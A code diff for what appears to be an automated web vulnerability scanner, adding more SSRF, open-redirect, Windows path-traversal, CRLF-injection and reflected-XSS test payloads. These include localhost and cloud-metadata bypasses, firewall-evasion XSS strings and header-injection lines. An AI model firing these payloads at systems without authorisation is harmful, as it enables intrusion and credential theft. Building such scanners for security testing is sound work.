@@ -78,13 +78,29 @@ _SSRF_PAYLOADS = [
     "http://127.0.0.1:3306",
     "http://127.0.0.1:6379",
     "http://127.0.0.1:8080",
+    # IPv6 localhost
     "http://[::1]",
+    "http://[0:0:0:0:0:0:0:1]",
+    # Decimal/hex/octal IP bypass
     "http://0x7f000001",
     "http://2130706433",
     "http://0177.0.0.1",
+    "http://0x7f.0x00.0x00.0x01",
+    "http://017700000001",
+    # DNS rebinding / zero bypass
+    "http://0.0.0.0",
+    "http://127.1",
+    "http://127.0.1",
+    # Redirect bypass
+    "http://localtest.me",
+    "http://spoofed.burpcollaborator.net",
+    # URL schema tricks
+    "http://127.0.0.1:80@example.com",
+    "http://example.com@127.0.0.1",
     # File protocol
     "file:///etc/passwd",
     "file:///etc/hostname",
+    "file:///proc/self/environ",
     # Cloud metadata
     "http://169.254.169.254/latest/meta-data/",
     "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
@@ -262,13 +278,36 @@ async def test_ssrf(
 # ---------------------------------------------------------------------------
 
 _REDIRECT_PAYLOADS = [
+    # Standard
     "https://example.com",
+    "http://example.com",
+    # Protocol-relative
     "//example.com",
+    "///example.com",
+    # Backslash bypass
     "/\\example.com",
+    "\\\\example.com",
+    # Auth bypass
     "https://example.com@legitimate.com",
+    "https://legitimate.com@example.com",
+    # CRLF header injection redirect
     "/%0d%0aLocation:%20https://example.com",
-    "/example.com",
+    # Subdomain confusion
     "https://legitimate.com.example.com",
+    # Null byte
+    "https://example.com%00.legitimate.com",
+    # URL-encoded
+    "https:%2f%2fexample.com",
+    # Tab/newline bypass
+    "http://example%09.com",
+    "http://example%0d.com",
+    # JavaScript protocol (for href-based)
+    "javascript:alert(1)//https://",
+    # Data URI
+    "data:text/html,<script>alert(1)</script>",
+    # Relative path bypass
+    "/example.com",
+    ".example.com",
 ]
 
 
@@ -381,6 +420,12 @@ _LFI_PAYLOADS_WINDOWS = [
     "C:\\Windows\\win.ini",
     "../../../../../../Windows/win.ini",
     "..\\..\\..\\..\\..\\Windows\\win.ini",
+    "....\\\\....\\\\....\\\\Windows\\win.ini",
+    "C:/Windows/win.ini",
+    "..%5c..%5c..%5c..%5cWindows%5cwin.ini",
+    "%2e%2e%5c%2e%2e%5cWindows%5cwin.ini",
+    "C:\\Windows\\System32\\drivers\\etc\\hosts",
+    "../../../../../../Windows/System32/drivers/etc/hosts",
 ]
 
 # Base64-encoded /etc/passwd starts with "cm9vd" (base64 of "root:")
@@ -447,10 +492,22 @@ async def test_lfi(
 # ---------------------------------------------------------------------------
 
 _CRLF_PAYLOADS = [
+    # Standard CRLF
     "%0d%0aX-Injected:BugHound",
     "%0AX-Injected:BugHound",
     "%0DX-Injected:BugHound",
+    # Unicode/UTF-8 bypass
     "%E5%98%8A%E5%98%8DX-Injected:BugHound",
+    # Double encoding
+    "%250d%250aX-Injected:BugHound",
+    # Null byte + CRLF
+    "%00%0d%0aX-Injected:BugHound",
+    # Tab-based
+    "%09X-Injected:BugHound",
+    # Header injection for cache poisoning
+    "%0d%0aContent-Length:0%0d%0a%0d%0a",
+    # Set-Cookie injection
+    "%0d%0aSet-Cookie:bughound=1",
 ]
 
 
@@ -561,7 +618,7 @@ _CSTI_PAYLOADS = [
 _XSS_MARKER = "bughound9x5s"
 
 _REFLECTED_XSS_PAYLOADS = [
-    # Basic reflection probes — check if marker appears unescaped in HTML
+    # Basic script injection
     (f'<script>{_XSS_MARKER}</script>', f"<script>{_XSS_MARKER}</script>"),
     (f'"><script>{_XSS_MARKER}</script>', f"<script>{_XSS_MARKER}</script>"),
     (f"'><script>{_XSS_MARKER}</script>", f"<script>{_XSS_MARKER}</script>"),
@@ -569,13 +626,25 @@ _REFLECTED_XSS_PAYLOADS = [
     (f'"><img src=x onerror={_XSS_MARKER}>', f"onerror={_XSS_MARKER}"),
     (f"'><img src=x onerror={_XSS_MARKER}>", f"onerror={_XSS_MARKER}"),
     (f'" onfocus={_XSS_MARKER} autofocus="', f"onfocus={_XSS_MARKER}"),
-    # SVG/details
+    # SVG/details/body/iframe
     (f"<svg/onload={_XSS_MARKER}>", f"onload={_XSS_MARKER}"),
     (f"<details open ontoggle={_XSS_MARKER}>", f"ontoggle={_XSS_MARKER}"),
-    # Template literal (inside JS context)
+    (f"<body onload={_XSS_MARKER}>", f"onload={_XSS_MARKER}"),
+    (f"<iframe src=javascript:{_XSS_MARKER}>", f"javascript:{_XSS_MARKER}"),
+    # WAF bypass — case variation
+    (f"<ScRiPt>{_XSS_MARKER}</ScRiPt>", f"<ScRiPt>{_XSS_MARKER}</ScRiPt>"),
+    # WAF bypass — tag splitting
+    (f"<scr<script>ipt>{_XSS_MARKER}</scr</script>ipt>", _XSS_MARKER),
+    # WAF bypass — encoding
+    (f"<svg onload&#x3D;{_XSS_MARKER}>", _XSS_MARKER),
+    # Input autofocus
+    (f'"><input autofocus onfocus={_XSS_MARKER}>', f"onfocus={_XSS_MARKER}"),
+    # Template literal (JS context)
     (f"${{`{_XSS_MARKER}`}}", _XSS_MARKER),
     # Href javascript
     (f'javascript:void("{_XSS_MARKER}")', f'javascript:void("{_XSS_MARKER}")'),
+    # HTML tag injection (basic — confirms tag injection possible)
+    (f"<b>{_XSS_MARKER}</b>", f"<b>{_XSS_MARKER}</b>"),
 ]
 
 # Context detection: what kind of HTML context is the reflection in?
